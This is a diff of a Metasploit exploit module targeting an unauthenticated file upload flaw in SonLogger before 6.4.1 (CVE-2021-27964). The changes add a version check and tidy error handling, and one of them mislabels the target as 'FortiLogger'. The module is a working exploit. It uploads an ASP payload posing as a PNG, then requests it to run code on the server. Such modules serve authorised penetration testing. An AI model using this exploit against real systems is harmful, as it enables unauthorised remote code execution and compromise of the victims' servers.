@@ -16,9 +16,9 @@ class MetasploitModule < Msf::Exploit::Remote
         info,
         'Name' => 'SonLogger Arbitrary File Upload Exploit',
         'Description' => %q{
-            This module exploits an unauthenticated arbitrary file upload
-            via insecure POST request. It has been tested on version 4.2.3.3 in
-            Windows 10 Enterprise.
+          This module exploits an unauthenticated arbitrary file upload
+          via insecure POST request. It has been tested on version < 6.4.1 in
+          Windows 10 Enterprise.
         },
         'License' => MSF_LICENSE,
         'Author' =>
@@ -27,8 +27,8 @@ class MetasploitModule < Msf::Exploit::Remote
           ],
         'References' =>
           [
-            ['CVE', '']
-            ['URL', 'https://erberkan.github.io']
+            ['CVE', 'CVE-2021-27964'],
+            ['URL', 'https://erberkan.github.io/']
           ],
 
         'Platform' => ['win'],
@@ -37,13 +37,13 @@ class MetasploitModule < Msf::Exploit::Remote
         'Targets' =>
           [
             [
-              'SonLogger - 4.2.3.3',
+              'SonLogger < 6.4.1',
               {
                 'Platform' => 'win'
               }
             ],
           ],
-        'DisclosureDate' => '2021-03-01',  
+        'DisclosureDate' => '2021-03-01',
         'DefaultTarget' => 0
       )
     )
@@ -51,13 +51,13 @@ class MetasploitModule < Msf::Exploit::Remote
     register_options(
       [
         Opt::RPORT(5000),
-        OptString.new('TARGETURI', [true, 'The base path to the SonLogger', '/'])
-      ], self.class
+        OptString.new('TARGETURI', [true, 'The base path to the FortiLogger', '/'])
+      ]
     )
   end
 
   def check_product_info
-    res = send_request_cgi(
+    send_request_cgi(
       'uri' => normalize_uri(target_uri.path, '/shared/GetProductInfo'),
       'method' => 'POST',
       'data' => '',
@@ -73,15 +73,24 @@ class MetasploitModule < Msf::Exploit::Remote
   def check
     begin
       res = check_product_info
-      if res && res.code == 200
-        if JSON.parse(res.body)['Version'] == '4.2.3.3'
-          Exploit::CheckCode::Vulnerable
-        else
-          Exploit::CheckCode::Safe
-        end
+
+      unless res
+        return CheckCode::Unknown('Target is unreachable.')
+      end
+
+      unless res.code == 200
+        return CheckCode::Unknown("Unexpected server response: #{res.code}")
+      end
+
+      version = Gem::Version.new(JSON.parse(res.body)['Version'])
+
+      if version < Gem::Version.new('6.4.1')
+        CheckCode::Vulnerable("SonLogger version #{version}")
+      else
+        CheckCode::Safe("SonLogger version #{version}")
       end
     rescue JSON::ParserError
-      Exploit::CheckCode::Safe
+      fail_with(Failure::UnexpectedReply, 'The target may have been updated')
     end
   end
 
@@ -91,12 +100,12 @@ class MetasploitModule < Msf::Exploit::Remote
 
   def exploit
     begin
-      print_good('Generate Payload !')
+      print_good('Generate Payload')
       data = create_payload
 
-      boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(rand(10) + 5)}"
+      boundary = "----WebKitFormBoundary#{rand_text_alphanumeric(rand(5..14))}"
       post_data = "--#{boundary}\r\n"
-      post_data << "Content-Disposition: form-data; name=\"file\"; filename=\"b3r.asp\"\r\n"
+      post_data << "Content-Disposition: form-data; name=\"file\"; filename=\"#{rand_text_alphanumeric(rand(5..11))}.asp\"\r\n"
       post_data << "Content-Type: image/png\r\n"
       post_data << "\r\n#{data}\r\n"
       post_data << "--#{boundary}\r\n"
@@ -112,21 +121,35 @@ class MetasploitModule < Msf::Exploit::Remote
           'X-Requested-With' => 'XMLHttpRequest'
         }
       )
-      if res && res.code == 200
-        if JSON.parse(res.body)['Message'] == 'Error in saving file'
-          print_error('Error for upload payload..')
-        else
-          print_good('Payload has been uploaded !')
-
-          handler
-
-          print_status('Executing payload...')
-          send_request_cgi({
-            'uri' => normalize_uri(target_uri.path, '/Assets/temp/hotspot/img/logohotspot.asp'),
-            'method' => 'GET'
-          }, 5)
-        end
+      unless res
+        fail_with(Failure::Unreachable, 'No response from server')
       end
+
+      unless res.code == 200
+        fail_with(Failure::Unknown, "Unexpected server response: #{res.code}")
+      end
+
+      json_res = begin
+        JSON.parse(res.body)
+      rescue JSON::ParserError
+        nil
+      end
+
+      if json_res.nil? || json_res['Message'] == 'Error in saving file'
+        fail_with(Failure::UnexpectedReply, 'Error uploading payload')
+      end
+
+      print_good('Payload has been uploaded')
+
+      handler
+
+      print_status('Executing payload...')
+      send_request_cgi({
+        'uri' => normalize_uri(target_uri.path, '/Assets/temp/hotspot/img/logohotspot.asp'),
+        'method' => 'GET'
+      }, 5)
     end
+  rescue StandardError
+    fail_with(Failure::UnexpectedReply, 'Failed to execute the payload')
   end
 end
